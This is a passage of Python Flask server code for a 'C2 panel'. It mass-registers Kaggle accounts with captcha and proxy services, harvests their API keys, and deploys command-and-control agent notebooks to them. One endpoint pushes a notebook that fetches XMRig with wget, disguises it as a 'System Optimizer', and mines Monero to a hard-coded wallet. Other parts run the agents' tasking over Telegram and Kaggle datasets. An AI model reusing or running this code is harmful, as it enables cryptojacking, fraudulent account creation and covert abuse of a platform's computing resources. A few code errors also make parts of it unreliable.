            "licenses": [{"name": "CC0-1.0"}],
            "keywords": ["c2"],
            "data": [{"name": "commands.json", "description": "Commands"}]
        }
        (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
        
        # Push dataset
        result = subprocess.run(
            ["kaggle", "datasets", "create", "-p", tmpdir, "--dir-mode", "zip"],
            capture_output=True, text=True, timeout=60,
            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
        )
        
        if result.returncode == 0 or "successfully" in result.stdout.lower():
            log_event("dataset_push", f"{username}/{dataset_name}")
            return jsonify({"status": "ok", "message": "Dataset created"})
        else:
            # Try to update existing dataset
            result = subprocess.run(
                ["kaggle", "datasets", "version", "-p", tmpdir, "-m", "Update commands", "--dir-mode", "zip"],
                capture_output=True, text=True, timeout=60,
                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
            )
            
            if result.returncode == 0 or "successfully" in result.stdout.lower():
                log_event("dataset_update", f"{username}/{dataset_name}")
                return jsonify({"status": "ok", "message": "Dataset updated"})
        
        return jsonify({"error": result.stderr[:200]}), 500

@app.route("/api/kaggle/kernel/output", methods=["POST"])
@login_required
def get_kernel_output():
    """Get output from a kernel (for dataset-based C2 result collection)."""
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    api_key = data.get("api_key")
    kernel_slug = data.get("kernel_slug")
    
    if not username or not api_key or not kernel_slug:
        return jsonify({"error": "username, api_key, kernel_slug required"}), 400
    
    with tempfile.TemporaryDirectory() as tmpdir:
        result = subprocess.run(
            ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
            capture_output=True, text=True, timeout=120,
            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
        )
        
        output_files = []
        for f in Path(tmpdir).iterdir():
            if f.is_file():
                content = f.read_text(errors='ignore')[:50000]
                output_files.append({"name": f.name, "content": content})
        
        return jsonify({"files": output_files})

@app.route("/api/kaggle/dataset-c2/agents", methods=["GET"])
@login_required
def dataset_c2_get_agents():
    """Get agents from kernel output (Dataset C2) and save to DB."""
    username = request.args.get("username", "cassandradixon320631")
    api_key = request.args.get("api_key", os.environ.get("KAGGLE_KEY", ""))
    kernel_slug = request.args.get("kernel", "cassandradixon320631/c2-channel")
    
    if not api_key:
        # Try config
        api_key = get_config("kaggle_api_key", "")
        username = get_config("kaggle_username", username)
    
    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            result = subprocess.run(
                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
                capture_output=True, text=True, timeout=120,
                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
            )
        except Exception as e:
            return jsonify({"error": str(e)}), 500
        
        # Parse c2-agents.json
        agents_file = Path(tmpdir) / "c2-agents.json"
        agents = []
        if agents_file.exists():
            try:
                agents = json.loads(agents_file.read_text())
                if not isinstance(agents):
                    agents = [agents] if isinstance(agents, dict) else []
            except:
                agents = []
        
        # Save to DB
        db = get_db()
        saved_count = 0
        for agent in agents:
            agent_id = agent.get("id", "")
            if not agent_id:
                continue
            
            existing = db.execute("SELECT id FROM agents WHERE id=?", (agent_id,)).fetchone()
            if existing:
                db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1 WHERE id=?", (agent_id,))
            else:
                db.execute("""INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
                              VALUES (?, ?, ?, ?, ?, ?, ?)""",
                           (agent_id, agent.get("hostname", ""), agent.get("username", "kaggle"),
                            agent.get("os", "linux"), agent.get("arch", "x64"),
                            "kaggle", agent.get("platform_type", "kaggle")))
            saved_count += 1
        
        db.commit()
        
        return jsonify({"agents": agents, "saved": saved_count})

# Deploy progress tracking with persistence
DEPLOY_STATE_FILE = BASE_DIR / "data" / "deploy_state.json"

def load_deploy_state():
    if DEPLOY_STATE_FILE.exists():
        try:
            return json.loads(DEPLOY_STATE_FILE.read_text())
        except:
            pass
    return {"running": False, "total": 0, "deployed": 0, "errors": [], "current_kernel": "", "completed_kernels": []}

def save_deploy_state(state):
    DEPLOY_STATE_FILE.parent.mkdir(parents=True, exist_ok=True)
    DEPLOY_STATE_FILE.write_text(json.dumps(state, indent=2))

deploy_progress = load_deploy_state()

@app.route("/api/kaggle/deploy/agent", methods=["POST"])
@login_required
def kaggle_deploy_agent():
    """Deploy persistent C2 agent to all kernels."""
    
    if deploy_progress["running"]:
        return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
    
    data = request.get_json(silent=True) or {}
    poll_interval = data.get("poll_interval", 30)
    # Telegram C2 - no URL needed, works directly via Telegram API
    # Get Telegram config for notebook
    telegram_bot_token = get_config("telegram_bot_token", "")
    telegram_chat_id = get_config("telegram_chat_id", "")
    
    if not telegram_bot_token:
        return jsonify({"error": "telegram_bot_token not configured. Set in /api/config"}), 400
    
    # Load agent notebook template (Telegram C2 version)
    notebook_path = BASE_DIR / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
    if not notebook_path.exists():
        return jsonify({"error": "Agent notebook template not found"}), 500
    
    notebook_template = notebook_path.read_text()
    
    # Get all Kaggle accounts - use validated accounts with kernels access
    valid_accounts_path = Path(__file__).parent / "data" / "accounts_valid.json"
    if valid_accounts_path.exists():
        kaggle_accounts = json.loads(valid_accounts_path.read_text())
    else:
        accounts = account_store.get_all()
        kaggle_accounts = [a for a in accounts if a.get("platform") == "kaggle" and a.get("api_key")]
    
    total_kernels = len(kaggle_accounts)  # 1 kernel per account (Kaggle limit: 5 CPU sessions)
    
    # Initialize progress
    deploy_progress.update({
        "running": True,
        "total": total_kernels,
        "deployed": 0,
        "errors": [],
        "current_kernel": "",
        "start_time": time.time(),
        "completed_kernels": [],
        "c2_url": c2_url
    })
    save_deploy_state(deploy_progress)
    
    def do_deploy():
        for account in kaggle_accounts:
            if not deploy_progress["running"]:
                break
                
            username = account.get("kaggle_username")
            api_key = account.get("api_key_new") or account.get("api_key")
            log_event("kaggle_deploy", f"{username}: api_key={api_key[:10] if api_key else 'NONE'}... (len={len(api_key) if api_key else 0})")
            
            if not username or not api_key:
                continue
            
            # Deploy 1 kernel per account (Kaggle limit: 5 CPU sessions total)
            kernel_num = 1
            kernel_id = f"kaggle-{username}-agent{kernel_num}"
            kernel_slug = f"{username}/c2-agent-{kernel_num}"
            
            # Skip already deployed AND checked in
            if kernel_id in kaggle_agents_state:
                continue
            
            deploy_progress["current_kernel"] = kernel_slug
            save_deploy_state(deploy_progress)
            
            try:
                # Prepare notebook with config - replace only string values
                notebook = notebook_template.replace("C2_SERVER_URL", c2_url)
                # Extract IP from ngrok URL for DNS-free access
                import socket
                try:
                    from urllib.parse import urlparse
                    host = urlparse(c2_url).netloc
                    c2_ip = socket.gethostbyname(host)
                except:
                    c2_ip = "18.192.31.165"  # Fallback ngrok IP
                notebook = notebook.replace("C2_SERVER_IP_PLACEHOLDER", c2_ip)
                notebook = notebook.replace("'KERNEL_ID'", f"'{kernel_id}'")  # Only replace string value
                notebook = notebook.replace("'API_KEY'", f"'{api_key}'")  # Only replace string value
                notebook = notebook.replace("'POLL_INTERVAL = 30'", f"'POLL_INTERVAL = {poll_interval}'")
                
                # Create temp dir
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir_path = Path(tmpdir)
                    
                    # Kernel metadata
                    metadata = {
                        "id": kernel_slug,
                        "title": f"C2 Agent {kernel_num}",
                        "code_file": "notebook.ipynb",
                        "language": "python",
                        "kernel_type": "notebook",
                        "is_private": True,
                        "enable_gpu": True,
                        "enable_internet": True
                    }
                    (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
                    (tmpdir_path / "notebook.ipynb").write_text(notebook)
                    
                    # Push kernel
                    result = subprocess.run(
                        ["kaggle", "kernels", "push", "-p", tmpdir],
                        capture_output=True, text=True, timeout=60,
                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
                    )
                    
                    if result.returncode == 0 or "successfully" in result.stdout.lower():
                        # Wait for checkin (up to 300 seconds - Kaggle queue)
                        checkin_timeout = 300
                        checkin_start = time.time()
                        checkin_success = False
                        
                        while time.time() - checkin_start < checkin_timeout:
                            if kernel_id in kaggle_agents_state:
                                checkin_success = True
                                break
                            time.sleep(2)
                            socketio.emit("deploy_progress", deploy_progress)
                        
                        if checkin_success:
                            deploy_progress["deployed"] += 1
                            if "completed_kernels" not in deploy_progress:
                                deploy_progress["completed_kernels"] = []
                            deploy_progress["completed_kernels"].append(kernel_slug)
                        else:
                            deploy_progress["errors"].append(f"{kernel_slug}: checkin timeout after {checkin_timeout}s")
                    else:
                        deploy_progress["errors"].append(f"{kernel_slug}: {result.stderr[:100]}")
                        
            except Exception as e:
                deploy_progress["errors"].append(f"{kernel_slug}: {str(e)[:100]}")
            
            # Save state after each kernel
            save_deploy_state(deploy_progress)
            
            # Emit progress via socket
            socketio.emit("deploy_progress", deploy_progress)
            
            # Small delay between kernels
            time.sleep(0.5)
        
        deploy_progress["running"] = False
        deploy_progress["current_kernel"] = ""
        deploy_progress["end_time"] = time.time()
        
        log_event("kaggle_deploy_agent", f"{deploy_progress['deployed']}/{deploy_progress['total']}")
        socketio.emit("deploy_complete", deploy_progress)
    
    # Start deploy in background
    threading.Thread(target=do_deploy, daemon=True).start()
    
    return jsonify({
        "status": "started",
        "total": total_kernels,
        "message": "Deploy started, check progress via WebSocket"
    })

@app.route("/api/kaggle/deploy/dataset-agent", methods=["POST"])
@login_required
def kaggle_deploy_dataset_agent():
    """Deploy dataset-based C2 agent (for kernels without internet)."""
    
    if deploy_progress["running"]:
        return jsonify({"error": "Deploy already running", "progress": deploy_progress}), 400
    
    data = request.get_json(silent=True) or {}
    
    # Load dataset-based agent notebook template
    notebook_path = BASE_DIR / "templates" / "notebooks" / "agent_notebook_dataset.ipynb"
    if not notebook_path.exists():
        return jsonify({"error": "Dataset agent notebook template not found"}), 500
    
    notebook_template = notebook_path.read_text()
    
    # Get all Kaggle accounts
    valid_accounts_path = Path(__file__).parent / "data" / "accounts_valid.json"
    if valid_accounts_path.exists():
        kaggle_accounts = json.loads(valid_accounts_path.read_text())
    else:
        accounts = account_store.get_all()
        kaggle_accounts = [a for a in accounts if a.get("platform") == "kaggle" and a.get("api_key")]
    
    total_kernels = len(kaggle_accounts)
    
    # Initialize progress
    deploy_progress.update({
        "running": True,
        "total": total_kernels,
        "deployed": 0,
        "errors": [],
        "current_kernel": "",
        "start_time": time.time(),
        "completed_kernels": [],
        "mode": "dataset"
    })
    save_deploy_state(deploy_progress)
    
    def do_deploy_dataset():
        def setup_kaggle_creds(username, api_key):
            """Setup kaggle.json file - CLI requires this, env vars don't work for write operations."""
            kaggle_dir = Path.home() / ".kaggle"
            kaggle_dir.mkdir(parents=True, exist_ok=True)
            kaggle_json = kaggle_dir / "kaggle.json"
            kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
            os.chmod(kaggle_json, 0o600)
        
        for account in kaggle_accounts:
            if not deploy_progress["running"]:
                break
                
            username = account.get("kaggle_username")
            api_key = account.get("api_key_new") or account.get("api_key")
            log_event("kaggle_deploy", f"{username}: api_key={api_key[:10] if api_key else 'NONE'}... (len={len(api_key) if api_key else 0})")
            
            if not username or not api_key:
                continue
            
            kernel_num = 1
            kernel_id = f"kaggle-{username}-agent{kernel_num}"
            kernel_slug = f"{username}/c2-agent-{kernel_num}"
            
            if kernel_id in kaggle_agents_state:
                continue
            
            deploy_progress["current_kernel"] = kernel_slug
            save_deploy_state(deploy_progress)
            
            try:
                # Create commands dataset first
                dataset_name = "c2-commands"
                commands_data = load_dataset_commands()
                dataset_ok = False
                
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir_path = Path(tmpdir)
                    (tmpdir_path / "commands.json").write_text(json.dumps(commands_data, indent=2))
                    metadata = {
                        "title": dataset_name,
                        "id": f"{username}/{dataset_name}",
                        "subtitle": "Command dataset for C2 agents communication",
                        "description": "Commands for C2 agents",
                        "licenses": [{"name": "CC0-1.0"}],
                        "keywords": ["c2"],
                        "data": [{"name": "commands.json", "description": "Commands"}]
                    }
                    (tmpdir_path / "dataset-metadata.json").write_text(json.dumps(metadata, indent=2))
                    
                    # Create dataset
                    setup_kaggle_creds(username, api_key)
                    log_event("kaggle_dataset", f"{username}: Creating dataset...")
                    result = subprocess.run(
                        ["kaggle", "datasets", "create", "-p", tmpdir, "--dir-mode", "zip"],
                        capture_output=True, text=True, timeout=60,
                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
                    )
                    
                    log_event("kaggle_dataset", f"{username}: create returncode={result.returncode}")
                    log_event("kaggle_dataset", f"{username}: stdout={result.stdout[:200] if result.stdout else 'empty'}")
                    log_event("kaggle_dataset", f"{username}: stderr={result.stderr[:200] if result.stderr else 'empty'}")
                    
                    if result.returncode == 0 or "already exists" in result.stderr.lower():
                        dataset_ok = True
                    else:
                        # Try update
                        log_event("kaggle_dataset", f"{username}: Trying dataset version update...")
                        result = subprocess.run(
                            ["kaggle", "datasets", "version", "-p", tmpdir, "-m", "Update commands", "--dir-mode", "zip"],
                            capture_output=True, text=True, timeout=60,
                            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
                        )
                        log_event("kaggle_dataset", f"{username}: version returncode={result.returncode}")
                        log_event("kaggle_dataset", f"{username}: stdout={result.stdout[:200] if result.stdout else 'empty'}")
                        log_event("kaggle_dataset", f"{username}: stderr={result.stderr[:200] if result.stderr else 'empty'}")
                        if result.returncode == 0:
                            dataset_ok = True
                
                if not dataset_ok:
                    deploy_progress["errors"].append(f"{kernel_slug}: Dataset creation failed")
                    log_event("kaggle_deploy", f"{kernel_slug}: SKIPPED - dataset failed")
                    continue
                
                # Prepare notebook
                notebook = notebook_template.replace("'KERNEL_ID'", f"'{kernel_id}'")
                notebook = notebook.replace("'API_KEY'", f"'{api_key}'")
                notebook = notebook.replace("'COMMANDS_DATASET'", f"'{username}/c2-commands'")
                
                # Create kernel with dataset attached
                with tempfile.TemporaryDirectory() as tmpdir:
                    tmpdir_path = Path(tmpdir)
                    kernel_metadata = {
                        "id": kernel_slug,
                        "title": f"C2 Agent {kernel_num}",
                        "code_file": "notebook.ipynb",
                        "language": "python",
                        "kernel_type": "notebook",
                        "is_private": True,
                        "dataset_sources": [f"{username}/c2-commands"],
                        "enable_internet": False
                    }
                    (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(kernel_metadata, indent=2))
                    (tmpdir_path / "notebook.ipynb").write_text(notebook)
                    
                    log_event("kaggle_kernel", f"{username}: Pushing kernel...")
                    setup_kaggle_creds(username, api_key)
                    result = subprocess.run(
                        ["kaggle", "kernels", "push", "-p", tmpdir],
                        capture_output=True, text=True, timeout=60,
                        env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
                    )
                    
                    log_event("kaggle_kernel", f"{username}: push returncode={result.returncode}")
                    log_event("kaggle_kernel", f"{username}: stdout={result.stdout[:300] if result.stdout else 'empty'}")
                    log_event("kaggle_kernel", f"{username}: stderr={result.stderr[:300] if result.stderr else 'empty'}")
                    
                    if result.returncode == 0 or "successfully" in result.stdout.lower():
                        deploy_progress["deployed"] += 1
                        deploy_progress["completed_kernels"].append(kernel_slug)
                        kaggle_agents_state[kernel_id] = {
                            "last_checkin": time.time(),
                            "info": {"mode": "dataset"},
                            "pending_commands": [],
                            "results": []
                        }
                        log_event("kaggle_deploy", f"{kernel_slug}: SUCCESS")
                    else:
                        error_msg = result.stderr[:200] if result.stderr else result.stdout[:200] if result.stdout else "Unknown error"
                        deploy_progress["errors"].append(f"{kernel_slug}: {error_msg}")
                        log_event("kaggle_deploy", f"{kernel_slug}: FAILED - {error_msg}")
                        
            except Exception as e:
                deploy_progress["errors"].append(f"{kernel_slug}: {str(e)[:100]}")
            
            save_deploy_state(deploy_progress)
            socketio.emit("deploy_progress", deploy_progress)
            time.sleep(0.5)
        
        deploy_progress["running"] = False
        deploy_progress["current_kernel"] = ""
        deploy_progress["end_time"] = time.time()
        log_event("kaggle_deploy_dataset", f"{deploy_progress['deployed']}/{deploy_progress['total']}")
        socketio.emit("deploy_complete", deploy_progress)
    
    threading.Thread(target=do_deploy_dataset, daemon=True).start()
    return jsonify({"message": "Dataset-based deploy started", "status": "started", "total": total_kernels})

@app.route("/api/kaggle/deploy/progress", methods=["GET"])
@login_required
def kaggle_deploy_progress():
    """Get current deploy progress."""
    return jsonify(deploy_progress)

@app.route("/api/kaggle/start-miner", methods=["POST"])
@login_required
def kaggle_start_miner():
    """Start miner on specific Kaggle kernel."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")
    
    if not kernel_id:
        return jsonify({"error": "kernel_id required"}), 400
    
    # Parse kernel_id
    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
    if len(parts) != 2:
        return jsonify({"error": f"invalid kernel_id format: {kernel_id}"}), 400
    
    username, kernel_num = parts
    
    # Get account
    accounts = account_store.get_all()
    account = None
    for a in accounts:
        if a.get("kaggle_username") == username:
            account = a
            break
    
    if not account:
        return jsonify({"error": f"account not found: {username}"}), 404
    
    # Try multiple API key fields
    api_key = account.get("api_key_legacy") or account.get("api_key_new") or account.get("api_key")
    if not api_key:
        return jsonify({"error": f"no api_key for account {username}"}), 400
    
    # Miner code
    miner_code = '''import subprocess, json, os, time

WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL = "pool.hashvault.pro:80"
WORKER = "''' + kernel_id + '''"

config = {
    "autosave": True,
    "cpu": True,
    "opencl": False,
    "cuda": False,
    "pools": [{"url": POOL, "user": WALLET, "pass": WORKER, "keepalive": True}]
}

with open(".optimizer_config.json", "w") as f:
    json.dump(config, f)

print("[Setup] Downloading XMRig...")
subprocess.run(["wget", "-q", "https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
subprocess.run(["tar", "xf", "xmrig-6.16.4-linux-static-x64.tar.gz"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
os.rename("xmrig-6.16.4/xmrig", "optimizer")
subprocess.run(["chmod", "+x", "optimizer"]).wait()

print("[Setup] Starting Kaggle System Optimizer v2.1...")
proc = subprocess.Popen(["nice", "-n", "19", "./optimizer", "-c", ".optimizer_config.json"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

for i in range(10):
    line = proc.stdout.readline()
    if line:
        print(line.strip())

print("[Status] Optimizer running in background")
print(f"[Worker] {WORKER}")
print(f"[Pool] {POOL}")

while True:
    time.sleep(60)
'''
    
    # Push kernel with miner
    kernel_slug = f"{username}/c2-agent-{kernel_num}"
    
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Notebook
            notebook = {
                "cells": [{
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": [line + "\n" for line in miner_code.split("\n")]
                }],
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
                "nbformat": 4, "nbformat_minor": 4
            }
            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook, indent=2))
            
            # Metadata
            metadata = {
                "id": kernel_slug,
                "title": f"C2 Agent {kernel_num}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True
            }
            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Push
            result = subprocess.run(
                ["kaggle", "kernels", "push", "-p", tmpdir],
                capture_output=True, text=True, timeout=60,
                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
            )
            
            if result.returncode == 0 or "successfully" in result.stdout.lower():
                log_event("miner_start", f"{kernel_id}")
                return jsonify({"status": "ok", "message": "Miner started"})
            else:
                return jsonify({"status": "error", "error": result.stderr[:200]})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})

@app.route("/api/autoreg/account/<reg_id>/logs")
@login_required
def autoreg_account_logs(reg_id):
    """Get detailed logs for account."""
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    
    # Get logs from database
    db = get_db()
    logs = db.execute(
        "SELECT * FROM logs WHERE details LIKE ? ORDER BY ts DESC LIMIT 500",
        (f"%{reg_id}%",)
    ).fetchall()
    db.close()
    
    return jsonify({
        "account": acc,
        "logs": [dict(l) for l in logs]
    })


# ──────────────────────── API: KAGGLE AUTO-DEPLOY ────────────────────────

kaggle_auto_deploy_progress = {
    "running": False,
    "stage": "",
    "account": None,
    "dataset": None,
    "kernel": None,
    "error": None,
    "logs": []
}

@app.route("/api/kaggle/auto-deploy", methods=["POST"])
@login_required
def kaggle_auto_deploy():
    """Full automated Kaggle deployment: create account -> get API key -> create dataset -> deploy kernel."""
    global kaggle_auto_deploy_progress
    
    if kaggle_auto_deploy_progress["running"]:
        return jsonify({"error": "Deploy already running"}), 409
    
    data = request.get_json(silent=True) or {}
    
    # Reset progress
    kaggle_auto_deploy_progress = {
        "running": True,
        "stage": "init",
        "account": None,
        "dataset": None,
        "kernel": None,
        "error": None,
        "logs": []
    }
    
    def _log(msg):
        kaggle_auto_deploy_progress["logs"].append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        socketio.emit("kaggle_auto_deploy_progress", kaggle_auto_deploy_progress)
    
    def _run():
        try:
            # Stage 1: Create account via autoreg
            _log("Stage 1: Creating Kaggle account...")
            kaggle_auto_deploy_progress["stage"] = "autoreg"
            
            job = job_manager.create_job(
                platform="kaggle",
                mail_provider=data.get("mail_provider", "boomlify"),
                count=1,
                headless=data.get("headless", True),
                proxy=data.get("proxy", ""),
                browser=data.get("browser", "chrome")
            )
            job.set_socketio(socketio)
            
            # Wait for account creation
            for _ in range(300):  # 5 min timeout
                time.sleep(1)
                if job.status == "done":
                    break
                if job.status == "error":
                    raise Exception(f"Autoreg failed: {job.error}")
            
            # Get created account
            accounts = [a for a in account_store.get_all() if a.get("platform") == "kaggle"]
            if not accounts:
                raise Exception("No Kaggle account created")
            
            account = accounts[-1]  # Latest account
            kaggle_auto_deploy_progress["account"] = account
            _log(f"✓ Account created: {account.get('username')}")
            
            # Stage 2: Generate Legacy API Key
            _log("Stage 2: Generating API key...")
            kaggle_auto_deploy_progress["stage"] = "api_key"
            
            reg_id = account.get("id")
            api_key_result = None
            
            # Use legacy-key endpoint
            import subprocess
            result = subprocess.run(
                ["python3", "-c", f"""
import sys
sys.path.insert(0, '{BASE_DIR}')
from src.agents.kaggle.legacy_key import generate_legacy_key
result = generate_legacy_key('{reg_id}')
print(result)
"""],
                capture_output=True, text=True, timeout=120, cwd=str(BASE_DIR)
            )
            
            if result.returncode == 0:
                api_key = result.stdout.strip().split('\n')[-1]
                if len(api_key) > 30:
                    account["api_key"] = api_key
                    account_store.update(reg_id, {"api_key": api_key})
                    _log(f"✓ API key generated: {api_key[:8]}...")
                else:
                    raise Exception("Invalid API key format")
            else:
                raise Exception(f"API key generation failed: {result.stderr[:100]}")
            
            # Stage 3: Update config.json (preserve Telegram C2)
            _log("Stage 3: Updating config.json...")
            kaggle_auto_deploy_progress["stage"] = "config"
            
            config_path = BASE_DIR / "config.json"
            cfg = {}
            if config_path.exists():
                try:
                    cfg = json.loads(config_path.read_text())
                except: pass
            
            # Preserve Telegram C2 config
            telegram_bot_token = cfg.get("telegram_bot_token")
            telegram_chat_id = cfg.get("telegram_chat_id")
            
            cfg["kaggle_username"] = account.get("username")
            cfg["kaggle_api_key"] = account.get("api_key")
            cfg["updated"] = int(time.time())
            
            # Ensure Telegram C2 is preserved
            if telegram_bot_token:
                cfg["telegram_bot_token"] = telegram_bot_token
            if telegram_chat_id:
                cfg["telegram_chat_id"] = telegram_chat_id
            
            config_path.write_text(json.dumps(cfg, indent=2))
            _log(f"✓ Config updated for: {account.get('username')}")
            if telegram_bot_token and telegram_chat_id:
                _log(f"✓ Telegram C2 preserved: chat_id={telegram_chat_id}")
            
            # Stage 4: Create dataset and kernel
            _log("Stage 4: Creating dataset and kernel...")
            kaggle_auto_deploy_progress["stage"] = "deploy"
            
            from src.agents.kaggle.datasets import create_dataset_and_kernel
            result = create_dataset_and_kernel(
                username=account.get("username"),
                api_key=account.get("api_key"),
                kgat_token=account.get("api_key_new"),  # KGAT token for kernel push
                log_fn=_log
            )
            
            if result.get("success"):
                kaggle_auto_deploy_progress["dataset"] = result.get("dataset_slug")
                kaggle_auto_deploy_progress["kernel"] = result.get("kernel_slug")
                _log(f"✓ Dataset: {result.get('dataset_slug')}")
                _log(f"✓ Kernel: {result.get('kernel_slug')}")
            else:
                raise Exception(f"Deploy failed: {result.get('error')}")
            
            # Done
            kaggle_auto_deploy_progress["stage"] = "done"
            kaggle_auto_deploy_progress["running"] = False
            _log("✓ Full deployment complete!")
            log_event("kaggle_auto_deploy", f"Account: {account.get('username')}, Kernel: {result.get('kernel_slug')}")
            
        except Exception as e:
            kaggle_auto_deploy_progress["error"] = str(e)
            kaggle_auto_deploy_progress["running"] = False
            kaggle_auto_deploy_progress["stage"] = "error"
            _log(f"✗ Error: {e}")
            log_event("kaggle_auto_deploy_error", str(e))
        
        socketio.emit("kaggle_auto_deploy_progress", kaggle_auto_deploy_progress)
    
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "message": "Full automated deployment started"})

@app.route("/api/kaggle/auto-deploy/progress")
@login_required
def kaggle_auto_deploy_progress():
    """Get current progress of automated deployment."""
    return jsonify(kaggle_auto_deploy_progress)

@app.route("/api/agent/<agent_id>/update", methods=["POST"])
@login_required
def update_agent(agent_id):
    data = request.get_json(silent=True) or {}
    db = get_db()
    allowed = ["group_name", "tags", "note", "sleep_interval", "jitter", "platform_type"]
    sets = []
    vals = []
    for k in allowed:
        if k in data:
            sets.append(f"{k}=?")
            vals.append(json.dumps(data[k]) if k == "tags" else data[k])
    if sets:
        vals.append(agent_id)
        db.execute(f"UPDATE agents SET {','.join(sets)} WHERE id=?", vals)
        db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/agent/<agent_id>/remove", methods=["DELETE"])
@login_required
def remove_agent(agent_id):
    db = get_db()
    db.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
    db.execute("DELETE FROM agents WHERE id=?", (agent_id,))
    db.commit()
    db.close()
    log_event("agent_removed", agent_id)
    return jsonify({"status": "ok"})

@app.route("/api/agents/<agent_id>", methods=["DELETE"])
@login_required
def remove_agent_alt(agent_id):
    """Alternative endpoint for frontend compatibility."""
    return remove_agent(agent_id)

@app.route("/api/agents")
@login_required
def api_agents():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    return jsonify([dict(a) for a in agents])

@app.route("/api/tasks/<agent_id>")
@login_required
def api_tasks(agent_id):
    db = get_db()
    tasks = db.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 200", (agent_id,)).fetchall()
    db.close()
    return jsonify([dict(t) for t in tasks])

# ──────────────────────── API: CONFIG ────────────────────────

CONFIG_KEYS = [
    "webhook_discord", "webhook_telegram",
    "encryption_key", "agent_token", "registration_open",
    "captcha_api_key", "fcb_api_keys",
    "boomlify_api_keys", "mail_provider",
    "telegram_bot_token", "telegram_chat_id",
]

@app.route("/api/config", methods=["GET", "POST"])
@login_required
def api_config():
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        for k in CONFIG_KEYS:
            if k in data:
                v = data[k]
                set_config(k, v)
                # Sync API keys to env vars and files for live use
                if k == "captcha_api_key" and v:
                    os.environ["CAPTCHA_API_KEY"] = v
                    os.environ["CAPTCHA_API_KEYS"] = v
                if k == "fcb_api_keys" and v:
                    os.environ["FCB_API_KEYS"] = ",".join(v.splitlines())
                    Path("data/fcb_keys.txt").write_text(v)
                if k == "boomlify_api_keys" and v:
                    Path("data/boomlify_keys.txt").write_text(v)
        log_event("config_updated", f"keys: {list(data.keys())}")
        return jsonify({"status": "ok"})
    return jsonify({k: get_config(k) for k in CONFIG_KEYS})

@app.route("/api/metrics")
@login_required
def api_metrics():
    """Get metrics in JSON format."""
    from core.metrics import MetricsCollector
    
    try:
        collector = MetricsCollector(DB_PATH)
        return jsonify(collector.export_json())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/metrics")
def prometheus_metrics():
    """Prometheus metrics endpoint (no auth for scraping)."""
    from core.metrics import MetricsCollector
    
    try:
        collector = MetricsCollector(DB_PATH)
        return Response(collector.export_prometheus(), mimetype="text/plain")
    except Exception as e:
        return Response(f"# Error: {e}\n", mimetype="text/plain"), 500
    return jsonify({
        "status": "ok",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    })

@app.route("/api/webhook/test", methods=["POST"])
@login_required
def webhook_test():
    send_webhook("Test Notification", f"Webhook test from C2 panel at {datetime.now()}")
    return jsonify({"status": "ok"})

# ──────────────────────── API: SCHEDULED TASKS ────────────────────────

@app.route("/api/scheduled")
@login_required
def list_scheduled():
    db = get_db()
    rows = db.execute("SELECT * FROM scheduled_tasks ORDER BY created_at DESC").fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/scheduled/<sid>")
@login_required
def get_scheduled(sid):
    db = get_db()
    row = db.execute("SELECT * FROM scheduled_tasks WHERE id=?", (sid,)).fetchone()
    db.close()
    if not row:
        return jsonify({"error": "not found"}), 404
